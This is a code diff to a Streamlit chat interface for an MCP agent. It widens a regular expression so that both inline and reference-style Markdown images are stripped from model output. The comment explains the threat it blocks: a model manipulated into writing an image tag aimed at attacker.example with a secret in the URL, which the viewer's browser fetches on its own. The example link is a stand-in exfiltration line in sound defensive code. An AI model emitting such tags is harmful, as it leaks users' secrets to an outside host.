@@ -19,13 +19,16 @@ import streamlit as st
 
 from mcp_agent.turns import TurnEvent
 
-#: Markdown image syntax. Streamlit renders it as an `<img>`, which the
-#: viewer's browser fetches without anyone clicking — so a model that has been
-#: talked into writing `![](https://attacker.example/?k=SECRET)` has an egress
-#: channel that no sandbox closes, because the request leaves the browser and
-#: not the container. Links are left alone: they need a click, and stripping
-#: them would cost the model its ability to cite anything.
-_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
+#: Markdown image syntax, both inline `![alt](url)` and reference `![alt][id]`.
+#: Streamlit renders either as an `<img>`, which the viewer's browser fetches
+#: without anyone clicking — so a model that has been talked into writing
+#: `![](https://attacker.example/?k=SECRET)` has an egress channel that no
+#: sandbox closes, because the request leaves the browser and not the
+#: container. The reference form was missed on the first pass and shipped an
+#: open route while the docstring below claimed it was shut. Links are left
+#: alone: they need a click, and stripping them would cost the model its
+#: ability to cite anything.
+_IMAGE = re.compile(r"!\[([^\]]*)\](?:\([^)]*\)|\[[^\]]*\])")
 
 
 def without_images(text: str) -> str:
